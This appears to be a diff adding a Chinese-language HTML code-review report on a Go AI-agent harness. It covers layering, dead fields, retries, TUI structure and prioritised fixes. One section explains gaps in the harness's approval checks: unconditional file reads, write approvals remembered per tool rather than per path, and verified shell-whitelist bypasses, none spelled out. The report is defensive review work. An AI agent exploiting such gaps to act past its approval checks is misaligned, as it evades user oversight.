+          <text x="32" y="138" font-family="var(--mono)" font-size="12.5" fill="var(--ink-2)">agent</text>
+          <!-- L3 session -->
+          <rect x="320" y="116" width="280" height="34" fill="var(--crit-soft)" stroke="var(--crit)"/>
+          <text x="332" y="138" font-family="var(--mono)" font-size="12.5" fill="var(--crit)">session</text>
+
+          <!-- L2 impl -->
+          <rect x="20" y="166" width="280" height="34" fill="var(--rule-soft)" stroke="var(--rule)"/>
+          <text x="32" y="188" font-family="var(--mono)" font-size="12.5" fill="var(--ink-2)">middleware/impl</text>
+          <!-- L2 tools -->
+          <rect x="320" y="166" width="280" height="34" fill="var(--crit-soft)" stroke="var(--crit)"/>
+          <text x="332" y="188" font-family="var(--mono)" font-size="12.5" fill="var(--crit)">tools</text>
+
+          <!-- L1 -->
+          <rect x="20" y="216" width="580" height="34" fill="var(--rule-soft)" stroke="var(--rule)"/>
+          <text x="32" y="238" font-family="var(--mono)" font-size="12.5" fill="var(--ink-2)">middleware · provider</text>
+
+          <!-- L0 -->
+          <rect x="20" y="266" width="580" height="34" fill="var(--accent-soft)" stroke="var(--accent)"/>
+          <text x="32" y="288" font-family="var(--mono)" font-size="12.5" fill="var(--accent)">config · messages · agentstate</text>
+          <text x="588" y="288" font-family="var(--mono)" font-size="10.5" fill="var(--accent)" text-anchor="end">零内部依赖</text>
+
+          <!-- violation: tools -> impl (right to left, same tier is fine; draw as sideways-up) -->
+          <path d="M330,166 C300,150 290,158 300,166" fill="none" stroke="var(--crit)" stroke-width="1.6" marker-end="url(#ar-bad)"/>
+          <text x="356" y="158" font-family="var(--mono)" font-size="10.5" fill="var(--crit)">tools → impl.EvictContent</text>
+
+          <!-- violation: session -> agent -->
+          <path d="M330,133 L306,133" fill="none" stroke="var(--crit)" stroke-width="1.6" marker-end="url(#ar-bad)"/>
+          <text x="356" y="112" font-family="var(--mono)" font-size="10.5" fill="var(--crit)">session → agent.Event</text>
+        </svg>
+      </div>
+      <figcaption>
+        实线红箭头为方向倒置的依赖。其余层级依赖自上而下，符合 config.go 注释里声明的
+        <code>config → provider → tools/middleware → agent</code>。
+      </figcaption>
+    </figure>
+
+    <div class="prose">
+      <h3><code>tools</code> → <code>middleware/impl</code></h3>
+      <p>
+        <code>shell.go:14</code> 为了 <code>impl.EvictContent</code>（截断+落盘）而import 中间件<em>实现</em>包。
+        工具是叶子能力，却依赖了一个 middleware 的具体实现。<code>EvictContent</code> 本质是通用的
+        "超长内容落盘+预览"工具函数，和 middleware 无关——挪到 <code>internal/evict</code> 或
+        <code>internal/middleware</code>（契约层）即可，两边都能引。
+      </p>
+      <h3><code>session</code> → <code>agent</code></h3>
+      <p>
+        <code>transcript.go:12</code> 与 <code>session.go:11</code> 为了 <code>agent.Event</code>
+        类型而 import<code>agent</code>。持久化层依赖编排层的事件枚举，意味着 transcript 格式被
+        agent 的事件定义绑住，且 session 无法在不引入 agent 的场景下复用。
+        更顺的方向：事件类型下沉到 <code>messages</code> 或独立 <code>events</code> 包，
+        或让 <code>session</code>暴露自己的 <code>Line</code> 写入 API，由 <code>cmd</code> 层做转换。
+      </p>
+    </div>
+  </section>
+
+  <section>
+    <h2>失效的设计意图 <span class="count">注释与代码不一致</span></h2>
+    <div class="prose">
+      <h3><code>state.CWD</code> 是死字段</h3>
+      <p>
+        <code>agentstate.go:28</code> 定义、<code>session.go:33-35</code> 用三行注释解释它的语义
+        （"会话启动目录，resume 后模型可知会话从哪启动"）、每次落盘都写它——
+        但全仓库<strong>没有任何代码读取它</strong>。
+        <code>shell_command</code> 的工作目录来自模型传的 <code>workdir</code> 参数，
+        文件工具没有 base 目录概念。
+        ADR-028 想解决的"resume 后 cwd 漂移"问题实际并未解决：resume 时进程 cwd 是用户当前所在目录，
+        与会话原始目录无关，而工具全都跟随进程 cwd。
+      </p>
+      <h3><code>ContextWindow</code> 解析后无人消费<span style="color:var(--ink-3);font-weight:400">（已规划，下一阶段）</span></h3>
+      <p>
+        <code>config.Resolve</code> 认真解析 <code>context_window</code>（含默认回退），
+        <code>providerBase</code> 提供 getter，但除了这个 getter 自己没有调用点。
+        <code>agent.Run</code> 的 <code>for {}</code> 循环（agent.go:135）<strong>既无轮次上限，也无 token 预算检查</strong>；
+        <code>stop_reason</code> 在<code>anthropic_stream.go</code> 里完全没有被读取，
+        <code>max_tokens</code> 截断会静默发生（正是 anthropic.go:42-45 注释里描述过的那个坑）。
+        上下文超限时的行为取决于 API 报错，harness 层没有保护。
+      </p>
+      <p>
+        <strong>定性说明</strong>：上下文管理（<code>compact</code>）与 workspace 边界均为作者<strong>已规划、下一阶段实施</strong>的内容，
+        属已知未实现，<em>不计为设计错误</em>。此处记录仅为标注当前状态：
+        在这两层补上之前，现有架构尚未经过长会话的真实压力检验。
+        <code>state.CWD</code> 成为死字段同理——它是 workspace 尚未落地的表现，而非疏漏。
+      </p>
+      <h3>无重试与退避</h3>
+      <p>
+        <code>grep -rn "retry\|backoff"</code> 在 provider / agent / cmd 全线零命中。
+        429与 5xx 直接冒泡成<code>EventError</code> 终止回合。对一个"可真实使用"的 harness，
+        这是最容易被用户感知的健壮性缺口。
+      </p>
+    </div>
+  </section>
+
+  <section>
+    <h2>设计层面 <span class="count">需在下一阶段一并考虑</span></h2>
+    <p class="lede">
+      与前述缺陷不同，这一条不是"忘了写校验"，而是<strong>权限模型缺少一个维度</strong>——
+      补实现补不出来，需要改 <code>Decide</code> 的输入契约。之所以单列，是因为它与
+      规划中的 workspace 有耦合：workspace 落地时若不一并考虑，会先做出一个只有硬边界的版本，回头再拆开加。
+    </p>
+
+    <div class="prose">
+      <h3>审批授权粒度：决策只看工具名，不看这次调用要碰什么</h3>
+      <p>
+        <code>Decide</code>（policy.go:180）的可见信息只有三样：工具名、当前模式、会话已批准列表。
+        它拿到 <code>call</code> 后第一步是 <code>classify(call.Name)</code> 把工具名映射成四类，
+        然后 read 与 todo 类<strong>在任何模式下直接放行</strong>：
+      </p>
+      <div class="evidence"><span class="lbl">policy.go:193-195· 决定只由工具名做出</span>case classRead, classTodo:
+    return OutcomeAllow, ""        <em>← call.Args 里的 path 从未被读取</em></div>
+      <p style="margin-top:14px">
+        对比同一函数里的 shell 分支，差异就很清楚——shell 是<em>看参数</em>的：
+      </p>
+      <div class="evidence"><span class="lbl">policy.go:201-210 · 同一函数，按参数内容决定</span>case classShell:
+    cmd := cmdOf(call)             <strong>← 解析参数</strong>
+    switch {
+    case isDangerous(cmd): ...     <strong>← 按内容判定</strong>
+    case isSafe(cmd):...</div>
+      <p style="margin-top:14px">
+        所以问题不是"<code>Decide</code> 拿不到参数"——<code>call.Args</code> 就在手里。
+        问题是 <code>toolClass</code> 这个抽象<strong>把"这个工具是什么"和"这次调用要碰什么"压成了同一个维度</strong>。
+        一旦某工具被归进 <code>classRead</code>，它的全部调用共享同一结论，参数不再有发言权。
+      </p>
+      <p>
+        结果是这个权限模型无法表达一句很基本的话：<em>允许读项目内的文件，不允许读项目外的。</em>
+        不是"尚未实现"，而是<strong>说不出来</strong>——<code>Outcome</code> 只有
+        Allow / Ask / Deny 三值，没有任何位置承载"在什么范围内 Allow"。
+      </p>
+
+      <h3>会话记忆继承了同一问题</h3>
+      <p>
+        <code>ApprovalKey</code>（policy.go:148-153）对非 shell 工具直接返回工具名：
+      </p>
+      <div class="evidence"><span class="lbl">policy.go:148-153</span>if call.Name == "shell_command" {
+    return NormalizeCommand(cmdOf(call))   <strong>← shell：按命令内容</strong>
+}
+return call.Name                           <em>← 其它：按工具名</em></div>
+      <p style="margin-top:14px">
+        于是用户在 <code>readonly</code> 下批准一次 <code>write_file</code> 并选"本会话记住"，
+        记住的是 <code>"write_file"</code> 这个字符串——<strong>此后本会话内写任何路径都不再询问</strong>。
+        用户同意的是"写这个文件"，系统记下的是"这个工具"。
+        这两件事在 shell 上被区分开了，在文件工具上没有。
+      </p>
+
+      <h3>与 workspace 的关系：加了 workspace 不会自动解决</h3>
+      <p>
+        假设下一阶段实现了路径边界，所有文件工具被限制在 workspace 内。那时越界访问会被工具层拒掉，
+        但 <code>Decide</code> 依然只看工具名、依然对所有 read 无条件 Allow。
+        workspace 于是成为一道<strong>硬边界</strong>：要么全允许，要么全拒绝，用户无法参与决定。
+      </p>
+      <p>
+        而审批系统的意义恰恰是处理"介于两者之间"的情形——workspace 内有个 <code>.env</code>，
+        或模型想读 workspace 外的某个配置文件而这次确实合理，用户看一眼就能判断。
+        两个机制解决的是不同问题：<strong>workspace 划定默认范围，审批负责范围之外交给人判断</strong>。
+        若 <code>Decide</code> 说不出"这次调用碰的是什么"，第二个机制在文件工具上就无法工作，只剩第一个。
+      </p>
+
+      <h3>修法</h3>
+      <p>
+        改动集中在一处：让分类结果携带"这次调用要碰的资源"。
+      </p>
+      <div class="evidence"><span class="lbl">方向示意</span>// classify 不再只吃名字
+type action struct {
+    class  toolClass
+    target string   // read/edit: 解析出的路径；shell: 命令；todo: 空
+}</div>
+      <p style="margin-top:14px">
+        <code>Decide</code> 拿到 <code>target</code> 后，read 类即可从"无条件 Allow"变为
+        "在允许范围内 Allow、范围外 Ask"；<code>ApprovalKey</code> 也顺势能对文件工具返回
+        <code>write_file:&lt;路径&gt;</code>，让会话记忆的粒度与 shell 对齐。
+      </p>
+      <p>
+        <code>Decide</code> 是纯函数且有独立测试（policy_test.go），改动不触及
+        <code>ApprovalMiddleware</code> 与 agent loop，成本不高。
+        关键是<strong>要在 workspace 那一版设计里一起想</strong>，而非事后追加。
+      </p>
+    </div>
+  </section>
+
+  <section>
+    <h2>可维护性</h2>
+    <div class="prose">
+      <h3>TUI<code>Model</code>：33 个字段，7 个状态字段隐式编码状态机</h3>
+      <p>
+        <code>model.go</code> 693 行、<code>view.go</code> 612 行，<code>ui/tui</code> 单包 2,457 行
+        （占非测试代码的三分之一）。<code>Model</code>（model.go:89-129）有 33 个字段，
+        状态由 7 个字段隐式编码：<code>running</code> / <code>turnDone</code> /
+        <code>interrupted</code> / <code>eventError</code> / <code>help</code> 五个 bool
+        加<code>appr</code> / <code>sel</code> 两个指针。第 10 项已证实其中一组非法组合可达。
+      </p>
+      <p>
+        字段本身内聚度不错，可直接按语义提取六个子结构：
+        <code>inputHistory/historyPos/draft/completion</code> → <code>composerState</code>（内聚最高）；
+        <code>running/turnDone/interrupted/eventError</code> → <code>turnState</code>（或干脆一个 <code>turnPhase</code> 枚举）；
+        <code>items/msgs/tools/stream</code> → <code>timelineData</code>；
+        <code>width/height/mainTop/composerTop/contentWidth/renderWidth</code> → <code>layoutState</code>（每帧由 <code>layout()</code> 重算）；
+        <code>appr/sel/help/toast/showThinking</code> → <code>overlayState</code>；
+        <code>hits/selectedHit/autoScroll</code> → <code>timelineNav</code>。
+        顺带一提，<code>msgs</code> 字段的注释自述是"direct index"，它可以从 <code>items</code> 过滤得出，属冗余缓存。
+      </p>
+      <h3>View 层宽度计算散落六处</h3>
+      <p>
+        <code>maxInt(1, m.width)</code> 的变体在 <code>view.go</code> 出现六次
+        （84 / 95 / 158 / 160 / 162 / 229），且语义各不相同（<code>m.width</code>、
+        <code>m.width-4</code>、<code>m.width-2</code>），与 <code>interaction.go:25</code>
+        的 <code>contentWidth</code> 属重复推导。列表选择器的渲染模式
+        （cursor 前缀 + 截断 + 选中高亮）在 <code>popup.go:225-237</code> 与
+        <code>view.go:156-164</code> 各写一遍，可提取 <code>renderListRows(items, cursor, width)</code>。
+        这解释了为什么 <code>TestModalsFitPanelWidth</code> 那类逐行宽度断言会存在——
+        宽度没有单一来源，只能靠测试兜。
+      </p>
+      <h3><code>Chain</code> 的 5 个 <code>Wrap*</code> 是同一段逻辑抄了 5 遍</h3>
+      <p>
+        <code>chain.go:161-226</code>：<code>WrapAgent</code> / <code>WrapReasoning</code> /
+        <code>WrapToolCall</code> / <code>WrapActing</code> / <code>WrapModelCall</code>
+        除了 hook 名和 Input 类型外<strong>字节级同构</strong>（倒序循环 + <code>inner := next</code> 快照）。
+        注释质量很高（把闭包捕获陷阱讲得很透），但这份优秀注释只挂在第一个函数上，
+        后四个是"同WrapAgent"。新增第6 个 hook 就要再抄一遍。Go泛型可以收成一个
+        <code>wrap[I any](mws, pick, core)</code>。这是全仓库最明确的一处可无风险收敛的重复。
+      </p>
+      <h3>工具层参数解析样板</h3>
+      <p>
+        7 个内置工具各自手写 <code>json.Unmarshal(args, &amp;p)</code> + 错误包装
+        （<code>fs.go</code> 三处、其余各一处），JSON Schema 全部手写字符串字面量。
+        加一个 <code>parseArgs[T](name, args) (T, error)</code> 泛型辅助可以消掉解析与错误包装的重复，
+        同时统一 <code>ToolError</code> 的措辞。
+      </p>
+      <h3>测试基建缺共享 helper</h3>
+      <p>
+        <code>fakeTool</code> 在 <code>agent_test.go</code> 与 <code>tools_test.go</code> 各定义一份；
+        测试配置模板在 <code>app_test.go</code>、<code>e2e_test.go</code>、<code>main_test.go</code> 各写一遍；
+        <code>newRC</code> 构造散落在三个 middleware 测试文件里。
+        另外 <code>tools</code> 包测试固定耗时 3.5s（<code>shell_test.go</code> 用真实
+        <code>sleep 3</code>），<code>agent_test.go:186</code> 用 30ms sleep 制造并发窗口后断言
+        <code>max&gt;=2</code>——慢机器上会偶发失败。
+      </p>
+    </div>
+  </section>
+
+  <section>
+    <h2>其余已核实的问题 <span class="count">未单列，但值得排期</span></h2>
+    <div class="prose">
+      <p>
+        <strong><code>AgentState</code> 原子写用固定 tmp 名。</strong>
+        <code>agentstate.go:121</code> 是 <code>tmp := path + ".tmp"</code>，不含进程/随机后缀。
+        同一会话被两个进程同时打开（<code>resume</code> 同一 id 两次）时，两个
+        <code>SaveFile</code> 会写同一个临时文件再各自 rename，互相覆盖。
+        另外没有 <code>fsync</code>，rename 后断电仍可能丢内容。
+        修法：<code>tmp := fmt.Sprintf("%s.%d.tmp", path, os.Getpid())</code> + 写完 <code>f.Sync()</code>。
+      </p>
+      <p>
+        <strong>transcript 行类型字符串三套各自维护。</strong>
+        写在<code>transcript.go:98-111</code>、读在<code>load.go:68-86</code>、
+        TUI 渲染在 <code>tui/run.go:53-86</code>，三处都是裸字符串字面量且
+        <code>load</code> 的 switch 没有 <code>default</code>——新增一种行类型会被静默吞掉，
+        不报错也不渲染。抽一组 <code>const LineType…</code> 到<code>session</code> 包即可。
+      </p>
+      <p>
+        <strong>resume 后 <code>ordinal</code> 与 <code>turn</code> 归零。</strong>
+        <code>Resume</code> 复用现有最大段并以 <code>O_APPEND</code> 打开（transcript.go:71-78），
+        但 <code>ordinal</code> 从 0 重新自增、<code>turn</code> 也重置。
+        同一文件内 ordinal 因此重复，与 transcript.go:46 "resume 按序加载兜底"的注释不符。
+        实际影响有限（<code>load</code> 完全忽略 <code>Ordinal</code>，按物理行序重建），
+        但这意味着注释承诺的排序兜底并不存在——字段是装饰性的。
+      </p>
+      <p>
+        <strong>工具 schema 与 Go struct 双份声明。</strong>
+        7 个工具的 JSON Schema 全部手写字符串（<code>todo.go:44-62</code> 嵌套 array/enum 写了 19 行），
+        同时又有一份对应的 Go struct 用于解析——<code>todo.go:66-67</code> 的注释甚至自称"对偶结构"。
+        改一边忘改另一边不会报错。更糟的是 <code>anthropic_messages.go:114</code> 用
+        <code>_ = json.Unmarshal(...)</code> 静默吞掉 schema 语法错误，模型会收到一个空 schema。
+      </p>
+      <p>
+        <strong>thinking 不重放只靠单点"不读取"。</strong>
+        ADR-025 的约束仅由 <code>anthropic_messages.go:45-47</code> 不读 <code>Thinking</code> 字段实现，
+        没有任何测试断言重放请求里不含 thinking。且 thinking-only 的消息会被整条丢弃
+        （anthropic_messages.go:34-35）。这类"靠约定维持"的约束最容易在重构中失效。
+      </p>
+      <p>
+        <strong>双轨审计靠时序而非契约。</strong>
+        transcript 记全量、conversation 记截断，这个区分完全依赖
+        "<code>emit</code> 早于 <code>ToolOutputMiddleware</code> 的 after 改写"这一时序
+        （agent.go:281 对 tool_output.go:83-94）。代码里没有任何注释声明这层顺序依赖——
+        谁把 emit 挪到 middleware 之后，审计完整性就悄悄没了。第 08 项的 resume 锁死正是这个设计的副作用。
+      </p>
+    </div>
+  </section>
+
+  <section>
+    <h2>做得好的地方</h2>
+    <div class="good">
+      <div>
+        <h3>ADR 纪律</h3>
+        <p>
+          决策留痕到ADR-030，代码注释直接引用 ADR 编号。
+          <code>contract.go:5-11</code> 甚至解释了"为什么审批契约放middleware 而不放 impl"——
+          正是为了避免 import 环。这种把架构约束的<em>理由</em>写进代码的做法，比结论本身有价值。
+        </p>
+      </div>
+      <div>
+        <h3>无状态 agent 的设计确实站得住</h3>
+        <p>
+          <code>Agent</code> 只持不可变配置，会话全经 <code>rc</code> 传入，
+          middleware 实现（<code>SessionMiddleware</code>、<code>ApprovalMiddleware</code>）都是值类型无字段状态。
+          这让共享 chain 并发安全成为结构性保证而非约定，为后续并行 subagent 留好了路。
+          <code>-race</code> 在 agent/session/tui 三个包全绿印证了这点。
+        </p>
+      </div>
+      <div>
+        <h3>底层三包零内部依赖</h3>
+        <p>
+          <code>config</code>、<code>messages</code>、<code>agentstate</code> 都不import 任何
+          harness 内部包，<code>agentstate</code> 独立成包的理由（打破 middleware↔session 环）
+          写在包注释里。这是本项目分层最干净的部分，<code>config</code> 覆盖率 95.3% 也最高。
+        </p>
+      </div>
+      <div>
+        <h3>洋葱链与 pipeline 的语义区分清晰</h3>
+        <p>
+          5 个 onion hook 与 <code>onSystemPrompt</code> transformer pipeline 的差异
+          （套娃 vs 正序流水线）在 <code>ComposeSystemPrompt</code> 注释里讲明白了，
+          空链零开销透传的性质也点出来了。<code>TodoReminderMiddleware</code>
+          注入临时副本而非改 conversation，还特意注明"必须 copy 新 slice 否则写穿落盘"——
+          这是踩过坑才会留的注释。
+        </p>
+      </div>
+    </div>
+  </section>
+
+  <section>
+    <h2>建议优先级</h2>
+    <div class="tbl-wrap">
+      <table>
+        <thead>
+          <tr><th style="width:34px">#</th><th>动作</th><th style="width:88px">成本</th><th>理由</th></tr>
+        </thead>
+        <tbody>
+          <tr>
+            <td class="num">1</td>
+            <td>e2e <code>SendLine</code> → <code>SendUnterminated(x+"\r")</code></td>
+            <td class="num">~10 行</td>
+            <td>恢复 <code>go test ./...</code>。在此之前 CI 与本地全量测试都不可信。</td>
+          </tr>
+          <tr>
+            <td class="num">2</td>
+            <td><code>agent.Build(res, ...)</code> 改一个参数</td>
+            <td class="num">1 行</td>
+            <td>修掉 thinking 配置泄漏，纯收益无风险。</td>
+          </tr>
+          <tr>
+            <td class="num">3</td>
+            <td>resume 读侧跳过坏行 + 去掉 4MB 行长限制；transcript 超大 content 记指针</td>
+            <td class="num">~50 行</td>
+            <td>止住"一次大输出永久锁死会话"。数据丢失不可逆，优先级高于代码损坏。</td>
+          </tr>
+          <tr>
+            <td class="num">4</td>
+            <td><code>findSubsequence</code> 多匹配报歧义 + 利用 <code>@@</code> 定位</td>
+            <td class="num">~40 行</td>
+            <td>止住<code>apply_patch</code> 静默改错位置。唯一会<strong>损坏代码且不报错</strong>的缺陷。</td>
+          </tr>
+          <tr>
+            <td class="num">5</td>
+            <td>白名单前先拒 shell 元字符</td>
+            <td class="num">~15 行</td>
+            <td>堵住已验证的 6 个绕过案例，是最高性价比的安全修复。</td>
+          </tr>
+          <tr>
+            <td class="num">6</td>
+            <td><code>resolveInWorkspace</code> 公共辅助 + 全 5 个文件工具接入<br>
+              <span style="color:var(--accent)">↳ 同时把 <code>Decide</code> 改为参数感知（<code>action{class,target}</code>），
+              <code>ApprovalKey</code> 对文件工具带路径</span></td>
+            <td class="num">半天<br><span class="num">+半天</span></td>
+            <td>解决路径边界与 <code>state.CWD</code> 死字段。<strong>审批粒度必须与 workspace 同批做</strong>——
+              否则只得到硬边界，用户无法对边界外的个别请求做判断。</td>
+          </tr>
+          <tr>
+            <td class="num">7</td>
+            <td><code>RunTUI</code> 等 run goroutine 退出 + writer <code>closed</code> 标志 + shell 杀进程组 + patch 落盘前全校验</td>
+            <td class="num">半天</td>
+            <td>消掉 SIGTERM竞态 panic、孤儿进程残留与补丁半落盘。</td>
+          </tr>
+          <tr>
+            <td class="num">8</td>
+            <td>agent loop 加轮次上限；provider 加重试退避 + 读 <code>stop_reason</code></td>
+            <td class="num">1 天</td>
+            <td>"可真实使用"的门槛。当前 429 直接终止回合、截断静默发生。</td>
+          </tr>
+          <tr>
+            <td class="num">9</td>
+            <td><code>EvictContent</code> 与 <code>agent.Event</code> 下沉，修正依赖方向</td>
+            <td class="num">半天</td>
+            <td>趁包还小做，越晚越贵。不改行为，纯结构。</td>
+          </tr>
+          <tr>
+            <td class="num">10</td>
+            <td>三个 overlay 收成 tagged union；<code>Chain.Wrap*</code> 泛型收敛；<code>Model</code> 提子结构</td>
+            <td class="num">1–2 天</td>
+            <td>让 TUI 非法状态不可表达；消掉 5 倍重复。</td>
+          </tr>
+        </tbody>
+      </table>
+    </div>
+  </section>
+
+  <footer>
+    审查方法 · 完整读取全部非测试源码；TUI / 持久层 / 工具层另有三个并行子审查提供 file:line 级清单<br>
+    验证方法 · 10 项缺陷均以项目内可执行探针证实（跨 provider 解析、thinking 泄漏、CR/LF 对照、白名单绕过、5 工具边界 + 路径穿越、写后关 panic、孤儿进程、patch 首次匹配错改 + 无回滚、超大行/半行锁死resume、overlay 共存），探针已全部删除<br>
+    环境 · darwin 25.5.0 · go build / go vet 全绿 · 12 个单元测试包全部通过 · <code>-race</code> 在 agent/session/ui-tui 通过 · e2e 包挂死<br>
+    <span style="color:var(--ok)">复核说明 · 子审查提出的关键结论均经本人独立探针复验后才写入，两处已修正：Model 字段数为 33（非 38）；<code>handleKey</code> 的 home/end "隐式掉穿"实为期望行为（焦点在输入区时应交给 textarea 移动光标），不计为缺陷。overlay 共存的触发通道修正为队列消费而非按键——按键通道已被 <code>handleApprovalKey</code> 正确拦截。</span>
+  </footer>
+
+</div>
+</body>
+</html>
